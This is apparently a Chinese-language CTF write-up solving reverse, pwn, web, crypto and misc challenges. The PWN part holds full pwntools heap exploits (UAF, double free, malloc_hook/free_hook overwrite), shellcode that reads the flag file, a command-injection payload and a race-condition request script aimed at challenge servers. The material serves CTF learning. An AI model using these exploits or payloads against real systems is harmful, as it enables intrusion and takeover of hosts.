## REVERSE
### arithmetic
手脱UPX壳，然后接一个算法题，应该算作贪心？
```python
data = [...]

path = [[['0' for _ in range(i)] for j in range(i)] for i in range(1, 501)]

path[0][0] = ['1']
for i in range(1, 500):
    data[i][0] = data[i-1][0] + data[i][0]
    path[i][0] = path[i-1][0][:]
    path[i][0].append('1')
    data[i][i] = data[i-1][i-1] + data[i][i]
    path[i][i] = path[i-1][i-1][:]
    path[i][i].append('2')

for i in range(2, 500):
    for j in range(1, i):
        if data[i-1][j] > data[i-1][j-1]:
            data[i][j] += data[i-1][j]
            path[i][j] = path[i-1][j][:]
            path[i][j].append('1')
        else:
            data[i][j] += data[i-1][j-1]
            path[i][j] = path[i-1][j-1][:]
            path[i][j].append('2')

max = -1
for i in range(500):
    if data[499][i] > max:
        max = data[499][i]
print(max)

for i in range(500):
    if data[499][i] == max:
        for j in range(1, len(path[499][i])):
            print(path[499][i][j], end = '')
```

### babyre
动调得知text从明面上的"123456"最终会被修改为"wtxfei"。同时程序触发了一个除零异常使得input[32]由249变为了250。
```CPP
#include <iostream>
#include <cstring>

using namespace std;

int main()
{
    int enc[100] = {12052, 78, 20467, 109, 13016, 109, 27467, -110, 9807, 91, 21243, -100, 11121, 20, 10863, -107, 10490, 29, 10633, -101, 10420, 78, 17670, -38, 6011, -4, 16590, 125, 10723, 15, 7953, 255, 250};
    int i;
    char text[10] = "wtxfei";
    for(i = 31; i >= 0; i -= 4)
    {
        enc[i] ^= enc[i + 1] - text[(i + 1) % 6];
        enc[i-1] /= enc[i] + text[i % 6];
        enc[i-2] += enc[i - 1] ^ text[(i - 1) % 6];
        enc[i-3] -= enc[i - 2] * text[(i - 2) % 6];
    }
    for(i = 0; i < 32; i++)
    {
        printf("%c", enc[i]);
    }
    return 0;
}
```

### babyAndroid
名字用RC4加密，密钥通过strings.xml文件找到为`3e1fel`，解密得`G>IkH<aHu5FE3GSV`。
密码通过lib文件加载，使用AES加密，ECB模式，
密文`64A280FD1B20D28EFC529E13EEA1FD1E660B7A72A31BD8366FDC3DEE3C015763`，解密得`hgame{df3972d1b09536096cc4dbc5c}`。
解密过程可以通过cyberchef实现。

### ezcpp
做4遍TEA。
```CPP
#include <iostream>
#include <cstring>

using namespace std;

void TEA(int *a, int *b)
{
    unsigned int i, v0, v1, sum;
    v0 = *a;
    v1 = *b;
    sum = -559038737 * 32;
    for(i = 0; i < 32; i++)
    {
        v1 -= (sum + v0) ^ (4123 + 32 * v0) ^ (3412 + 16 * v0);
        v0 -= (sum + v1) ^ (2341 + 32 * v1) ^ (1234 + 16 * v1);
        sum += 559038737;
    }
    *a = v0;
    *b = v1;
}

int main()
{
    unsigned char input[100] = {136, 106, 176, 201, 173, 241,  51,  51, 148, 116, 181, 105, 115,  95,  48,  98,  74,  51,  99,  84,  95,  48, 114,  49, 101, 110,  84, 101,  68,  63,  33, 125};
    int i;
    unsigned int v0, v1, sum;

    TEA((int *)((char *)input + 3), (int *)((char *)input + 7));
    TEA((int *)((char *)input + 2), (int *)((char *)input + 6));
    TEA((int *)((char *)input + 1), (int *)((char *)input + 5));
    TEA((int *)((char *)input + 0), (int *)((char *)input + 4));

    for(i = 0; i < 32; i++)
    {
        printf("%c", input[i]);
    }
    return 0;
}
```

## PWN
### Elden Ring Ⅱ
程序存在UAF漏洞。先将tcache bins灌满，利用unsorted bins泄露libc基址。之后通过修改key值完成tcache bins double free，修改bk指针为malloc_hook附近地址。利用one_gadget提权。
```python
from pwn import *

# context.log_level = 'debug'

p = remote('106.14.57.14', 31411)
# p = process('./ERII')
# attachment = ELF('./ERII')
libc = ELF('./libc.so.6')

def create(index, size):
    p.recvuntil(b'>')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())

def delete(index):
    p.recvuntil(b'>')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())

def edit(index, content):
    p.recvuntil(b'>')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Content: ')
    p.sendline(content)

def show(index):
    p.recvuntil(b'>')
    p.sendline(b'4')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())

create(0, 0x80)
create(1, 0x80)
create(2, 0x80)
create(3, 0x80)
create(4, 0x80)
create(5, 0x80)
create(6, 0x80)
create(7, 0x80)
create(8, 0x80)

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)

delete(7)
show(7)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 96 - 0x1ecb80
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
print(hex(libc_base), hex(malloc_hook_addr))

create(9, 0x60)
create(10, 0x60)
delete(9)
edit(9, p64(0) * 2)
delete(9)

edit(9, p64(malloc_hook_addr - 35))
create(11, 0x60)
create(12, 0x60)
# 0xe3afe 0xe3b01 0xe3b04
edit(12, b'\x00' * (35-16) + p64(0) * 2 + p64(libc_base + 0xe3b01))
create(13, 0x20)

# gdb.attach(p)

p.interactive()
```
### ShellcodeMaster
用给定的22个字节完成将0x2333000地址给mprotect成rwx，然后重新读入shellcode。重新读入的内容完成orw。
```python
from pwn import *

context(arch = 'amd64')

p = remote('106.14.57.14', 31049)
# p = process('./SM')
# attachment = ELF('./')

shellcode = """
shl edi, 12
xor edx, edx
mov dl, 7
lea rax, [rdx + 3]
syscall

xchg eax, edx
xor al, al
mov esi, edi
xor edi, edi
syscall
"""

# gdb.attach(p)
p.send(asm(shellcode))

shellcode = """
mov rdi, 0x2333000
mov rsi, 0
mov rax, 2
syscall

mov rdi, 3
mov rsi, 0x2333500
mov rdx, 0x100
mov rax, 0
syscall

mov rdi, 1
mov rsi, 0x2333500
mov rdx, 0x100
mov rax, 1
syscall
"""

p.send(p64(0x67616c66) + b"a"*(22-8) + asm(shellcode))

p.interactive()
```

### fastnote
由于程序delete的时候指针清空了个寂寞，可以先申请8个0x80的并释放即可灌满tcachebin后填到unsortedbin里。此时通过show函数可以拿到main_arena+96。
由于程序并没有对序号进行查重，可以用同样的方式灌满tcachebin后进行fastbin double free。之后再free_hook处申请堆。
由于2.31的神奇操作会将fastbin里面的东西挪到tcachebin中去，因此没有大小检测。覆写free_hook为system函数地址。
```python
from pwn import *

# context.log_level = 'debug'

# p = process('./note')
p = remote('106.14.57.14', 30528)
libc = ELF('./libc-2.31.so')

def create(index, size, content):
    p.recvuntil(b'choice:')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content: ')
    p.sendline(content)

def delete(index):
    p.recvuntil(b'choice:')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())

def show(index):
    p.recvuntil(b'choice:')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())

create(0, 0x80, b'')
create(1, 0x80, b'')
create(2, 0x80, b'')
create(3, 0x80, b'')
create(4, 0x80, b'')
create(5, 0x80, b'')
create(6, 0x80, b'')
create(7, 0x80, b'')
create(8, 0x80, b'')

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)

show(7)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 96 - 0x1ecb80
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
free_hook_addr = libc_base + libc.symbols['__free_hook']
system_addr = libc_base + libc.symbols['system']
print(hex(libc_base), hex(malloc_hook_addr), hex(free_hook_addr))

create(0, 0x60, b'')
create(1, 0x60, b'')
create(2, 0x60, b'')
create(3, 0x60, b'')
create(4, 0x60, b'')
create(5, 0x60, b'')
create(6, 0x60, b'')
create(7, 0x60, b'')
create(8, 0x60, b'')
create(9, 0x60, b'')

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
delete(8)
delete(7)

create(0, 0x60, b'')
create(1, 0x60, b'')
create(2, 0x60, b'')
create(3, 0x60, b'')
create(4, 0x60, b'')
create(5, 0x60, b'')
create(6, 0x60, b'')
create(7, 0x60, p64(free_hook_addr))
create(8, 0x60, b'')
create(9, 0x60, b'')
create(10, 0x60, p64(system_addr))

create(11, 0x20, b'/bin/sh\x00')
delete(11)

p.interactive()
```

### old_fastnote
跟2.31的差不多，不过由于one_gadget一个都不成功，需要利用realloc前面的一坨push布置一下栈空间，人为构造一个能用的one_gadget条件。
```python
from pwn import *

# context.log_level = 'debug'

# p = process('./vuln')
p = remote('106.14.57.14', 31477)
attachment = ELF('./vuln')
libc = ELF('libc-2.23.so')

def create(index, size, content):
    p.recvuntil(b'choice:')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'Content: ')
    p.sendline(content)

def delete(index):
    p.recvuntil(b'choice:')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())

def show(index):
    p.recvuntil(b'choice:')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())

create(0, 0x80, b'')
create(1, 0x80, b'')
delete(0)
show(0)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 88 - 0x3c4b20
malloc_hook_addr = libc_base + libc.symbols['__malloc_hook']
realloc_hook_addr = libc_base + libc.symbols['__realloc_hook']
realloc_addr = libc_base + libc.symbols['realloc']
print(hex(libc_base), hex(malloc_hook_addr), hex(realloc_hook_addr), hex(realloc_addr))

create(2, 0x60, b'')
create(3, 0x60, b'')
create(4, 0x60, b'')

delete(2)
delete(3)
delete(2)

# 0x4527a 0xf03a4 0xf1247
create(5, 0x60, p64(malloc_hook_addr - 35))
create(6, 0x60, b'')
create(7, 0x60, b'')
create(8, 0x60, b'\x00' * (35 - 16 - 8) + p64(libc_base + 0xf1247) + p64(realloc_addr+8))

# gdb.attach(p, 'b *realloc+589')

p.recvuntil(b'choice:')
p.sendline(b'1')
p.recvuntil(b'Index: ')
p.sendline(str(9).encode())
p.recvuntil(b'Size: ')
p.sendline(str(0x40).encode())

p.interactive()
```


## WEB

### What the cow say?
不知道源码咋写的 

```bash
/*
```

能看到根目录文件  通配符

~ 显示当前root     *显示 当下目录           想到是shell    反引号执行命令

```bash
`tac /f?ag_is_here/flag_c0w54y`
```



### Select More Courses

傻逼密码 qwert123

学分上线拓展到了37

多发几个包

```python
import requests
import concurrent.futures

def send_post_request(url, data, headers):
    response = requests.post(url, headers=headers, json=data)
    return response.text

url1 = 'http://106.15.72.34:32635/api/expand'
url2 = 'http://106.15.72.34:32635/api/select'
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Origin': 'http://106.15.72.34:32635',
    'Referer': 'http://106.15.72.34:32635/expand',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cookie': 'session=MTcwNzIyNzYyMXxEWDhFQVFMX2dBQUJFQUVRQUFBcV80QUFBUVp6ZEhKcGJtY01DZ0FJZFhObGNtNWhiV1VHYzNSeWFXNW5EQW9BQ0cxaE5XaHlNREJ0fBDSdesqoeZ6giRN6u8hO7w-ZwtwS2Co0kEwI-BuRWYH'
}
data1 = {"username": "ma5hr00m"}
data2 = {"id": 1, "username": "ma5hr00m"}

with concurrent.futures.ThreadPoolExecutor() as executor:
    future1 = executor.submit(send_post_request, url1, data1, headers)
    future2 = executor.submit(send_post_request, url2, data2, headers)

    result1 = future1.result()
    result2 = future2.result()

print("Response from request 1:", result1)
print("Response from request 2:", result2)

url3='http://106.15.72.34:32635/api/ok'
#发get
req=requests.get(url3,headers=headers)
print(req.text)
```



### myflask

flask session伪造，根据容器启动时间猜测secret签名admin身份的session过身份验证。然后打pickle反序列化。


## CRYPTO

### midRSA/backpack

题目有bug，直接long_to_bytes()解密文就能得到flag，哈哈。

### midRSA revenge

已知明文的高位m0并且e非常小，可以用stereotyped message attack

m0直接long_to_bytes()就是flag的前半部分`hgame{c0ppr3smith_St3re`，算是提示了

用sage来着

```
m0 = 9999900281003357773420310681169330823266532533803905637 << 128
n = 27814334728135671995890378154778822687713875269624843122353458059697288888640572922486287556431241786461159513236128914176680497775619694684903498070577307810263677280294114135929708745988406963307279767028969515305895207028282193547356414827419008393701158467818535109517213088920890236300281646288761697842280633285355376389468360033584102258243058885174812018295460196515483819254913183079496947309574392848378504246991546781252139861876509894476420525317251695953355755164789878602945615879965709871975770823484418665634050103852564819575756950047691205355599004786541600213204423145854859214897431430282333052121
c = 456221314115867088638207203034494636244706611111621723577848729096069230067958132663018625661447131501758684502639383208332844681939698124459188571813527149772292464139530736717619741704945926075632064072125361516435631121845753186559297993355270779818057702973783391589851159114029310296551701456748698914231344835187917559305440269560613326893204748127999254902102919605370363889581136724164096879573173870280806620454087466970358998654736755257023225078147018537101
e = 5
PR.<x> = PolynomialRing(Zmod(n))
f = (x+m0)^e-c
m1 = f.small_roots(X=2^128, beta=1)[0]
print(m1)
```

解出m1就是明文的低位，也就是flag的后半部分`0typed_m3ssag3s}`


## MISC

### ek1ng_want_girlfriend

HTTP流量而已。把响应的jpg图片打开，就能看到flag

### ezWord

docx当成zip打开，找到两张图片和一个压缩包和提示，按照提示用bwmforpy3.py解开盲水印打开压缩包得到secret.txt，spam mimic->rot8000得到flag
